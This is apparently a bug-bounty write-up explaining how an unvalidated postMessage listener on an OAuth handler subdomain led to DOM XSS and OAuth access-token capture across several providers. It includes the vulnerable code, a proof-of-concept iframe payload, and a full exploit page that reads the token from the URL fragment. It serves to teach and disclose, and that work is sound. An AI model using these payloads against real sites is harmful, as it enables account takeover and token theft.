# From a `postMessage` Listener to OAuth Token Theft

If you ask me, `postMessage` is one of the most fun bug classes to hunt.

Most `postMessage` listeners end up being harmless.

But every now and then, you find one that feels... different.

That's usually a good sign to start digging deeper.

That's exactly what happened here.

What started as a simple `postMessage` listener eventually turned into a
DOM XSS that could be used to **steal** OAuth access tokens across six
different providers.

------------------------------------------------------------------------

# Understanding the Authentication Flow

Before jumping into the bug, here's a quick overview of how
`postMessage` is commonly used.

`postMessage` is commonly used when different browser windows need to
communicate with each other. You'll often see it in OAuth flows, where a
popup handles authentication and then sends the result back to the main
application.

While testing this target, I came across a feature that allowed users to
connect their Google Photos account and import photos directly into the
application.

From the user's perspective, the flow looked completely normal. After
clicking **"Connect Google Photos"**, the application first opened an
intermediate subdomain owned by the application. That subdomain then
launched the Google Photos OAuth flow.

Once authentication was complete, Google returned the OAuth response to
the same subdomain, which finished the authorization process and passed
the result back to the main application.

``` text
┌────────────────────┐
│ Main Application   │
└─────────┬──────────┘
          │
          │ Click "Connect Google Photos"
          ▼
┌────────────────────┐
│ OAuth Handler      │
│ (Subdomain)        │
└─────────┬──────────┘
          │ Opens Google OAuth popup
          ▼
┌────────────────────┐
│ Google Photos      │
│ OAuth              │
└─────────┬──────────┘
          │ User grants permission
          │ OAuth Response (Code/Token)
          ▼
┌────────────────────┐
│ OAuth Handler      │
│ (Subdomain)        │
└─────────┬──────────┘
          │ Completes authorization
          │ Sends result to the main app
          ▼
┌────────────────────┐
│ Main Application   │
└────────────────────┘
```

At this point, everything looked perfectly normal. The interesting part
wasn't the OAuth flow itself---it was how the main application and the
OAuth handler communicated after authentication.

------------------------------------------------------------------------

# Debugging the JavaScript

I opened the OAuth subdomain directly in a new tab instead of starting
the entire flow every time.

The page itself looked almost empty.no login form, and nothing that immediately stood out.

At first, the only provider exposed by the application was Google Photos. 
But while reading the JavaScript, I noticed that the OAuth subdomain already supported six different providers:

-   Google
-   Facebook
-   Dropbox
-   Instagram
-   Flickr
-   Skydrive

Whenever I analyze a new feature, I usually start by reading its JavaScript.

Rather than looking for vulnerabilities right away, I first try to understand how the feature works.

Once the application's logic becomes clear, the interesting parts usually start to reveal themselves.


After tracing the message flow for a few minutes, one thing immediately stood out.

The page accepted `postMessage` events without validating the sender's origin.

More importantly, the value extracted from the message was passed directly to `window.location.assign()`.

In other words, any attacker-controlled page that became the opener
could freely send `postMessage` events.

While tracing the message flow, I found the code responsible for
processing incoming messages:

``` javascript
e.prototype.handle = function(message) {
    return typeof message === "string" && this._is_for_me(message)
        // Remove the "logged_in:" prefix and pass the remaining value
       // to the registered callback.
        ? this.onRecieved(this._strip(message))
        : void 0;
};

var navigate = function(value) {
    // Whatever remains is passed directly to window.location.assign().
    // For example:
    // logged_in:javascript:alert(1)
    //                ↓
    // javascript:alert(1)
    return window.location.assign(value);
};

// Messages starting with "logged_in:" end up in navigate()
handlers = [
    new MessageHandler(/^logged_in:/, navigate)
];
```

This was the root cause of the vulnerability.

Whenever a message started with `logged_in:`, the application stripped the prefix and passed the remaining value directly to `window.location.assign()`.

In other words, any value following the `logged_in:` prefix became the new navigation target.

My first question was simple:

> **Could I send my own `logged_in:` message?**

It only took a few lines of code to find out.

``` html
<!DOCTYPE html>
<html>
<body>
    <iframe id="target-frame" src="https://sub.target.com" width="800" height="600"></iframe>
    <script>
        document.getElementById('target-frame').onload = function() {
            // Exploit payload triggers execution via location.assign sink
            document.getElementById('target-frame').contentWindow.postMessage('logged_in:javascript:alert(document.domain)', '*');
        };
    </script>
</body>
</html>
```

As soon as the iframe finished loading, the payload executed.

There was no origin validation, whitelist, or any other security check preventing an attacker-controlled page from sending arbitrary messages.

At this point, I had a working **DOM XSS via postMessage**.

For many reports, this is where the research ends.

For me, this was only the starting point.

------------------------------------------------------------------------

# Looking Beyond `alert(1)`

Finding the XSS wasn't the interesting part anymore.

The real question was whether it could be turned into something with actual impact.

A JavaScript popup is nice for proving code execution, but it rarely
represents the real impact.

This subdomain was responsible for handling OAuth responses from
multiple identity providers.

That immediately raised another question:

> **Could the XSS be executed during the OAuth flow itself?**

While analyzing one of the providers, I noticed that the OAuth response was returned through the URL fragment (`#access_token=...`).

This is where understanding the OAuth trust model becomes important.

The OAuth provider only returns the authorization code or access token to a trusted redirect URI registered by the application.

Once the OAuth response reaches that trusted endpoint, protecting it becomes the application's responsibility. If the application exposes the response through a client-side vulnerability, the OAuth provider has no visibility into what happens next.

Instead of stopping at `alert(1)`, I started thinking about how I could abuse the OAuth flow itself.

At this point, the interesting part wasn't the XSS anymore.

The real question was: **what could I do with JavaScript execution inside the OAuth handler?**

Since the handler was responsible for processing OAuth responses, I realized I could trigger the OAuth flow myself, wait for the provider to redirect back, and read the returned access token directly from the URL fragment.

From there, the exploit was simply a matter of chaining everything together.

The result was a working exploit that captured the OAuth access token after a successful authentication.

The attack looked like this:

``` text
Attacker Page
      │
      ▼
OAuth Handler
      │ postMessage("logged_in:javascript:...")
      ▼
DOM XSS
      │
      ▼
OAuth Provider
      │
      ▼
OAuth Handler
      │ Receives OAuth access token
      ▼
Injected JavaScript
      │ Reads token
      ▼
Attacker
```

## Final Exploit

``` html
<!DOCTYPE html>
<html>
<head>
    <title>Exploit</title>
</head>
<body>

    <iframe id="target-frame" 
            src="https://sub.target.com" 
            width="800" height="600">
    </iframe>

    <script>
        document.getElementById('target-frame').onload = function() {
            
            var payload = "javascript:(function(){" +
                "var url = 'https://sub.target.com/{provider-name}?url=' + encodeURIComponent(window.location.origin) + '&live_update=true';" +
                "window.open(url, 'popup', 'width=800,height=600');" +

                "window.addEventListener('hashchange', function() {" +
                    "if(window.location.hash.includes('access_token')) {" +
                        "var token = new URLSearchParams(window.location.hash.substring(1)).get('access_token');" +
                        "alert('Token Captured: ' + token);" +
                    "}" +
                "});" +
            "})();";
            
            document.getElementById('target-frame').contentWindow.postMessage('logged_in:' + payload, '*');
        };
    </script>

</body>
</html>
```

After a few iterations and a bit of debugging, the exploit worked as expected.

The same technique also worked against Facebook, Flickr, Dropbox,
Instagram, and Skydrive, but I've kept the write-up focused on a single
provider to avoid repeating the same flow.

------------------------------------------------------------------------

# Final Thoughts

One thing I've learned from bug hunting is that the best bugs are often
hidden behind complex application flows.

Before looking for vulnerabilities, spend time understanding how the
feature actually works.

Once you understand the application's logic, the bugs have a way of
revealing themselves.
